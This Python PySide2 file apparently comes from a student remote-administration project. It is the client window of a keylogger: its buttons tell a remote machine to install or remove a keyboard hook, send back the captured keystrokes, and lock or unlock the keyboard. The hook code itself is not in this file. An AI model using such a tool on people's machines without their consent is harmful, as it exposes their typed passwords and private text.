from os import close
from posixpath import expanduser
import sys
from tkinter.constants import S
from PySide2.QtCore import *
from PySide2 import QtGui, QtWidgets
from PySide2.QtGui import *
from PySide2.QtWidgets import *

from client import ClientState
from request_gui import Request
import client

class InputUI(Request):
    def __init__(self, parent, client):
        super().__init__(parent, client, 'KEYLOG')

    def setupUI(self):
        self.setWindowTitle(QCoreApplication.translate("InputWindow", "Keylog"))
        self.resize(400,400)

        self.hook_button = QPushButton(clicked = lambda:self.onHook())
        font = QtGui.QFont()
        font.setFamily("Helvetica")
        font.setPointSize(12)
        self.hook_button.setFont(font)
        self.hook_button.setStyleSheet("background-color: rgb(224, 237, 255)")
        self.hook_button.setObjectName("hook_button")
        self.hook_button.setText(QCoreApplication.translate("InputWindow", "Hook"))

        self.print_button = QPushButton(clicked = lambda:self.onPrint())
        font = QtGui.QFont()
        font.setFamily("Helvetica")
        font.setPointSize(12)
        self.print_button.setFont(font)
        self.print_button.setStyleSheet("background-color: rgb(224, 237, 255)")
        self.print_button.setObjectName("print_button")
        self.print_button.setText(QCoreApplication.translate("InputWindow", "Print"))

        self.clear_button = QPushButton(clicked = lambda: self.onClear())
        font = QtGui.QFont()
        font.setFamily("Helvetica")
        font.setPointSize(12)
        self.clear_button.setFont(font)
        self.clear_button.setStyleSheet("background-color: rgb(224, 237, 255)")
        self.clear_button.setObjectName("clear_button")
        self.clear_button.setText(QCoreApplication.translate("InputWindow", "Clear"))

        self.lock_button = QPushButton(clicked = lambda:self.onLock())
        font = QtGui.QFont()
        font.setFamily("Helvetica")
        font.setPointSize(12)
        self.lock_button.setFont(font)
        self.lock_button.setStyleSheet("background-color: rgb(224, 237, 255)")
        self.lock_button.setObjectName("lock_button")
        self.lock_button.setText(QCoreApplication.translate("InputWindow", "Lock"))

        self.keyBoxView = QTextEdit()
        font = QtGui.QFont()
        font.setFamily("Helvetica")
        font.setPointSize(12)
        self.keyBoxView.setFont(font)
        self.keyBoxView.setAlignment(Qt.AlignLeft | Qt.AlignTop)
        self.keyBoxView.setObjectName("keyBoxView")
        self.keyBoxView.setReadOnly(True)

        button_layout = QHBoxLayout()
        button_layout.addWidget(self.hook_button)
        button_layout.addSpacing(10)
        button_layout.addWidget(self.print_button)
        button_layout.addSpacing(10)
        button_layout.addWidget(self.lock_button)
        button_layout.addSpacing(10)
        button_layout.addWidget(self.clear_button)

        mainLayout = QVBoxLayout()
        mainLayout.addItem(button_layout)
        mainLayout.addSpacing(10)
        mainLayout.addWidget(self.keyBoxView)
        self.setLayout(mainLayout)

    def onHook(self):
        state, _ = self.client.MakeRequest("HOOK")
        if state == ClientState.SUCCEEDED:
            self.putTextWithNewLine('Hook đã được cài')
            self.hook_button.setText(QCoreApplication.translate("InputWindow", "Unhook"))
            self.hook_button.clicked.disconnect()
            self.hook_button.clicked.connect(self.onUnhook)
        else:
            self.putTextWithNewLine('Error')
        return None

    def onUnhook(self):
        state, _ = self.client.MakeRequest("UNHOOK")
        if state == ClientState.SUCCEEDED:
            self.putTextWithNewLine('Hook đã được gỡ')
            self.hook_button.setText(QCoreApplication.translate("InputWindow", "Hook"))
            self.hook_button.clicked.disconnect()
            self.hook_button.clicked.connect(self.onHook)
        else:
            self.putTextWithNewLine('Error')
        return None

    def onPrint(self):
        state, data = self.client.MakeRequest("FETCH")
        try:
            assert state == ClientState.SUCCEEDED, "KEYLOG FETCH request failed"
            data = data.decode("utf-8") if data else ""
            self.putTextWithNewLine(data)
        except Exception as e:
            self.putTextWithNewLine("Error")

    def onClear(self):
        state, _ = self.client.MakeRequest("CLEAR")
        self.keyBoxView.setReadOnly(False)
        self.keyBoxView.clear()
        self.keyBoxView.setReadOnly(True)

    def putTextWithNewLine(self, text):
        self.keyBoxView.setReadOnly(False)
        self.keyBoxView.append(text)
        self.keyBoxView.setReadOnly(True)

    def onLock(self):
        state, _ = self.client.MakeRequest("LOCK")
        if state == ClientState.SUCCEEDED:
            self.putTextWithNewLine('Keyboard locked')
            self.lock_button.setText(QCoreApplication.translate("InputWindow", "Unlock"))
            self.lock_button.clicked.disconnect()
            self.lock_button.clicked.connect(self.onUnlock)
        else:
            self.putTextWithNewLine('Error')
        return None

    def onUnlock(self):
        state, _ = self.client.MakeRequest("UNLOCK")
        if state == ClientState.SUCCEEDED:
            self.putTextWithNewLine('Keyboard unlocked')
            self.lock_button.setText(QCoreApplication.translate("InputWindow", "Lock"))
            self.lock_button.clicked.disconnect()
            self.lock_button.clicked.connect(self.onLock)
        else:
            self.putTextWithNewLine('Error')
        return None

    def ShowWindow(self):
        self.setupUI()
        self.show()
        pass

    def CleanUp(self):
        self.onUnhook()
        self.onUnlock()
        self.onClear()
        return super().CleanUp()

if __name__ == '__main__':
    from os import environ

    def suppress_qt_warnings():
        environ["QT_DEVICE_PIXEL_RATIO"] = "0"
        environ["QT_AUTO_SCREEN_SCALE_FACTOR"] = "1"
        environ["QT_SCREEN_SCALE_FACTORS"] = "1"
        environ["QT_SCALE_FACTOR"] = "1"

    suppress_qt_warnings()

    app = QtWidgets.QApplication(sys.argv)
    tmp = client.ClientProgram()
    demo = InputUI(None)
    demo.setupUI()
    demo.ShowWindow() 
    sys.exit(app.exec_())